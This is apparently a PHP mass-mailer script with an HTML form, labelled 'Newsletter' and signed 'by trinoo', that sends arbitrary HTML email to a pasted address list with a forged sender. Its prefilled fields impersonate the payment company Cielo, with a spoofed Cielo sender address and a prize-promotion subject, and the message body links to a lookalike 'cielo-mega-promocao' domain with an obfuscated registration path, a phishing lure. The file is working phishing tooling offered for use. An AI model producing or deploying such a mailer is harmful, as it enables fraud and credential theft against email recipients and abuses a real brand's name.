<?php

$testa = $_POST['veio'];

if($testa != "") {

				$message = $_POST['html'];

				$subject = $_POST['assunto'];

				$de = $_POST['de'];

				$to = $_POST['emails'];

				// ler o conteúdo do arquivo para uma string

				

				//$handle = fopen ($emails, "r");

				//$to = fread ($handle, filesize ($emails));

				//fclose ($handle);

				

				//$handle2 = fopen ($html, "r");

				//$message = fread ($handle2, filesize ($html));

				//fclose ($handle2);

				

			

				$headers  = "MIME-Version: 1.0\r\n";

				$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";

				$email = explode("\n", $to);



				$headers .= "From: ".$RealName." <".$de.">\r\n";





				$message = stripslashes($message);

				

				$i = 0;

				$count = 1;

				while($email[$i]) {

				

				$ok = "ok";

				

				

				if(mail($email[$i], $subject, $message, $headers))

					echo "* Número: $count <b>".$email[$i]."</b> <font color=green>OK</font><br><hr>";

				else

					echo "* Número: $count <b>".$email[$i]."</b> <font color=red>ERRO AO ENVIAR</font><br><hr>";

					

				$i++;

				$count++;

				}

$count--;

if($ok == "ok")

	echo "<script> alert('Terminou os emails. ".$count." e-mails enviados'); </script>";







}

?>

<html>

<head>

<title>Newsletter!!!</title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<style>

.normal {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 12px;

	color: #000000;

}

.form {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 10px;

	color: #333333;

	background-color: #FFFFFF;

	border: 1px dashed #666666;

}



.style1 {

	font-family: Verdana, Arial, Helvetica, sans-serif;

	font-weight: bold;

}

</style>

</head>

<body leftmargin="0" topmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0">

<form action="" method="post" enctype="multipart/form-data" name="form1">

<input type="hidden" name="veio" value="sim">

<table width="423" height="257" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">

<tr>

<td width="421" height="15" align="center" bgcolor="#F4F4F4">
<font size="6" face="Algerian">&nbsp;by trinoo</font></td>

</tr>

<tr>

<td height="223" valign="top" bgcolor="#FFFFFF">
<table width="145%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="213">

<tr>

<td align="right" height="17" width="26%">
<p align="left">
<input name="de" type="text" class="form" id="de" size="78" value="cielo.premiada@cielo.com" ></td>

<td width="10%" height="17">
<p align="left">
</td>

</tr>

<tr>

<td align="right" height="17" width="26%">
<p align="left">
<input name="assunto" type="text" class="form" id="assunto" size="78" value="Vantagens da Compra Premiada Cielo." ></td>

<td height="17">
<p align="left">
</td>

</tr>

<tr align="center" bgcolor="#F4F4F4">

<td height="20" colspan="2">
<p align="left">&nbsp;</td>

</tr>

<tr align="right">

<td height="50" colspan="2" valign="top">        
<p align="left">        <br>        <font color="#990000" size="1">

        <textarea name="html" cols="78" rows="6" wrap="VIRTUAL" class="form" id="html"><html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Clique aqui caso não consiga vis</title>
<script language="JavaScript">
</script>
</head>

<p align="center">
<a href="http://www.cielo-mega-promocao.freeweq.com/cadastro/?cdx?X3-7.ExXucIN.com.brxlliZ_05.TcRYN.-Segurna%E7aLL_GiOwm9XgEZzWKQeV2.LL_GiOwm9XgEZ-.dSKx2">
<span class="st">Visualizar</em> essa <em>
mensagem</em>.</span></a><br>
<br>
<p>&nbsp;</p>

</body>

</html></textarea>

        </font></td>

</tr>

<tr align="center" bgcolor="#F4F4F4">

<td height="1" colspan="2">
<p align="left"></td>

</tr>

<tr align="right">

<td height="43" colspan="2" valign="top">
<p align="left"><br>

<textarea name="emails" cols="78" rows="4" wrap="VIRTUAL" class="form" id="emails"></textarea> </td>

</tr>

<tr>

<td height="25" align="right" valign="top" width="26%">
<p align="left"><input type="submit" name="Submit" value="Enviar"></td>

<td align="center" valign="top" height="25">
<p align="left">&nbsp;</td>

</tr>

</table></td>

</tr>

<tr>

<td height="15" align="center" bgcolor="#F4F4F4">
<p align="left">&nbsp;</td>

</tr>

</table>

</form>

</body>
